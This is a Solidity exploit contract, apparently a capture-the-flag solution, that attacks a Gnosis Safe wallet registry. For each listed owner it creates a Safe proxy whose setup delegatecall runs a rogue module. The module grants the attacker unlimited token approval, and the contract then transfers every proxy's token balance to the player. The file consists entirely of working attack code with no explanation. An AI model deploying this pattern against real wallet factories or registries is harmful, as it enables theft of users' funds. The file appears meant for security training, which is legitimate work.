// SPDX-License-Identifier: MIT
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "hardhat/console.sol";
import "./WalletRegistry.sol";

contract MyGnosisSafe is GnosisSafe {
    event Approval(address, address);

    function approve(address exploit, address _token) external {
        IERC20 token = IERC20(_token);
        token.approve(exploit, type(uint256).max);
    }
}

contract Exploit {
    address[] public addresses;
    GnosisSafe public masterCopy;
    WalletRegistry public walletRegistry;
    GnosisSafeProxyFactory public walletFactory;
    IERC20 public token;
    address public player;

    constructor(address[] memory _addresses, GnosisSafe _masterCopy,
        WalletRegistry _walletRegistry, GnosisSafeProxyFactory _walletFactory,
        IERC20 _token, address _player) {

        addresses = _addresses;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        walletFactory = _walletFactory;
        token = _token;
        player = _player;

        exploit();
    }

    function exploit() internal {
        MyGnosisSafe myGnosisSafe = new MyGnosisSafe();

        for (uint256 i = 0; i < addresses.length; i++) {
            address owner = addresses[i];

            bytes memory data = abi.encodeWithSelector(MyGnosisSafe.approve.selector, address(this), token);
            address[] memory owners = new address[](1);
            owners[0] = owner;

            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector,
                owners,
                1,
                address(myGnosisSafe),
                data,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 0, IProxyCreationCallback(walletRegistry));

            assert(token.allowance(address(proxy), address(this)) == type(uint256).max);
            token.transferFrom(address(proxy), player, token.balanceOf(address(proxy)));
        }
    }
}